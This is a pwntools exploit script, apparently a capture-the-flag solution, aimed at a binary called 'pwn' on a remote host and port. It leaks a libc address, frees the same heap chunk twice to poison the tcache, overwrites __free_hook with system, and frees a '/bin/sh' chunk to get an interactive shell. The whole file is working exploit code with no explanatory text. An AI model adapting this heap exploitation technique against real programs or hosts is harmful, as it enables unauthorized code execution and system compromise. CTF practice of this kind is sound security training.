from pwn import *

binary = "./pwn"
lib = "./libc.so.6"

server = "65.1.92.179"
port = 49155

context.binary = binary

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	p = remote(server, port)
else:
	p = gdb.debug([binary], gdbscript = 'set debug-file-directory ./x86_64-linux-gnu \n b *0x4009a7 \n c')

if len(sys.argv) > 2 and sys.argv[2] == 'd':
	context.log_level = 'debug'

e = ELF(binary)
r = ROP(e)
l = ELF(lib)

e.checksec()


def create(idx, size, data):
	p.sendlineafter("exit\n", str(1))
	p.sendlineafter(":", str(idx))
	p.sendlineafter(":", str(size))
	p.sendlineafter(":", data)

def delete(idx):
	p.sendlineafter("exit\n", str(2))
	p.sendlineafter(":", str(idx))

p.recvuntil(": ")
strcpy = int(p.recv(14),16)
libc = strcpy - 0xb65b0
system = libc + l.symbols["system"]
free_hook = libc + l.symbols["__free_hook"]

log.info("strcpy : " + hex(strcpy))
log.info("libc : " + hex(libc))

delete(0)
delete(0)
create(0, 0x10, p64(free_hook))
create(1, 0x10, b"/bin/sh\x00")
create(2, 0x10, p64(system))
delete(1)

p.interactive()